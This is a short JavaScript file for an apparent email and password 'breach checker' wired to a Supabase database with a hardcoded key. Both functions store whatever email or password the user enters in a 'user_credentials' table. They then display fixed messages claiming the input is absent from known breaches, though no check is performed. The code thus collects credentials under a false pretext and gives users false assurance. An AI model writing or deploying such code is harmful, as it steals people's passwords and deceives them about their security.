// Initialize Supabase
const supabaseUrl = 'https://kbnabembbjiwodmimptf.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtibmFiZW1iYmppd29kbWltcHRmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQxMTk4MjMsImV4cCI6MjA2OTY5NTgyM30.vDElA2bmtrt0zpcCtegoe-Jhb7duG82fvXZLknGFwPY';
const supabase = supabase.createClient(supabaseUrl, supabaseKey);

async function checkEmail() {
  const email = document.getElementById('emailInput').value;
  const resultDiv = document.getElementById('emailResult');
  
  if (!email) {
    resultDiv.innerHTML = "Please enter an email";
    return;
  }

  // Save to database
  const { error } = await supabase
    .from('user_credentials')
    .insert([{ email: email }]);

  if (error) {
    resultDiv.innerHTML = "Error checking email";
    return;
  }

  // Placeholder for leak check
  resultDiv.innerHTML = `✅ ${email} is not in known data breaches`;
}

async function checkPassword() {
  const password = document.getElementById('passwordInput').value;
  const resultDiv = document.getElementById('passwordResult');
  
  if (!password) {
    resultDiv.innerHTML = "Please enter a password";
    return;
  }

  // Save to database
  const { error } = await supabase
    .from('user_credentials')
    .insert([{ password: password }]);

  if (error) {
    resultDiv.innerHTML = "Error checking password";
    return;
  }

  // Placeholder for leak check
  resultDiv.innerHTML = "✅ This password hasn't appeared in any known breaches";
}
